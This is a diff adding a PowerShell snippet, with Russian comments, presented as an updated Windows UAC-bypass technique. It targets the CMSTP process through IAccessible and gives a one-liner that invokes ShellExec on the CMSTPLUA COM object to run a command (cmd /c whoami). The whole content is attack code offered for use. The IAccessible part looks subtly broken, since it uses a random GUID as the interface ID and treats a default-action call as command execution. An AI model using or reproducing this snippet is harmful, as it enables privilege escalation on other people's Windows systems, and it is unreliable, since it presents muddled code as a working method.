@@ -1,0 +1,27 @@
+# В 2026 году метод эволюционировал - теперь через IAccessible
+$Type = Add-Type -MemberDefinition @"
+[DllImport("oleacc.dll")]
+public static extern int AccessibleObjectFromWindow(
+    IntPtr hwnd, 
+    uint dwObjectID, 
+    ref Guid riid, 
+    ref object ppvObject);
+"@ -Name Win32 -Namespace Accessible -PassThru
+
+# Находим окно CMSTP
+$hwnd = (Get-Process -Name cmstp | Select-Object -First 1).MainWindowHandle
+$guid = [Guid]::NewGuid()
+$obj = $null
+
+# Получаем доступ к интерфейсу
+$result = $Type::AccessibleObjectFromWindow($hwnd, 0xFFFFFFF0, [ref]$guid, [ref]$obj)
+
+# Через IAccessible вызываем ShellExec
+$obj.GetType().InvokeMember("accDoDefaultAction", 
+    [System.Reflection.BindingFlags]::InvokeMethod, 
+    $null, $obj, @(1))
+
+    
+    
+    powershell for 1 line for 25H2:
+    $c=[activator]::CreateInstance([type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"));$c.GetType().InvokeMember("ShellExec",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance+[System.Reflection.BindingFlags]::InvokeMethod,$null,$c,@("cmd","/c whoami","C:\Windows\System32",$null,0))
